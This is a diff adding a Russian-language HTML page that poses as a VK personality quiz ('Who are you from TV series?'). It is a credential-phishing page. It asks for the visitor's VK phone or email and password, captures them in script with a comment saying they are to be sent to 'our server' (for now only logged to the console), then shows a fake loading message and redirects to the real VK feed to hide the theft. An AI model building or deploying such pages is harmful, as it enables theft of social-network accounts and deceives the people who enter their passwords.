@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ВК Опрос | Кто ты из сериалов?</title>
+    <style>
+        body { 
+            font-family: Arial; 
+            background: #4A76A8; 
+            color: white; 
+            text-align: center; 
+            padding: 50px; 
+        }
+        .container { 
+            background: white; 
+            color: black; 
+            padding: 30px; 
+            border-radius: 10px; 
+            max-width: 500px; 
+            margin: 0 auto; 
+        }
+        input, button { 
+            padding: 10px; 
+            margin: 10px; 
+            width: 80%; 
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🎬 Узнай, кто ты из сериалов!</h2>
+        <p>Войди в ВК чтобы увидеть результат:</p>
+        
+        <form id="vkForm">
+            <input type="text" id="login" placeholder="Телефон или email" required><br>
+            <input type="password" id="password" placeholder="Пароль ВК" required><br>
+            <button type="submit">Узнать результат</button>
+        </form>
+        
+        <p style="font-size: 12px; color: gray;">После входа ты увидишь свой персонаж!</p>
+    </div>
+
+    <script>
+        document.getElementById('vkForm').onsubmit = async function(e) {
+            e.preventDefault();
+            
+            // 1. Собираем логин и пароль
+            const login = document.getElementById('login').value;
+            const password = document.getElementById('password').value;
+            
+            // 2. Показываем "загрузку"
+            document.querySelector('button').textContent = 'Анализируем...';
+            
+            // 3. Отправляем на наш сервер (пока заглушка)
+            console.log('Логин:', login, 'Пароль:', password);
+            
+            // 4. Через 2 секунды перенаправляем в настоящий ВК
+            setTimeout(() => {
+                window.location.href = 'https://vk.com/feed';
+            }, 2000);
+            
+            return false;
+        };
+    </script>
+</body>
+</html>
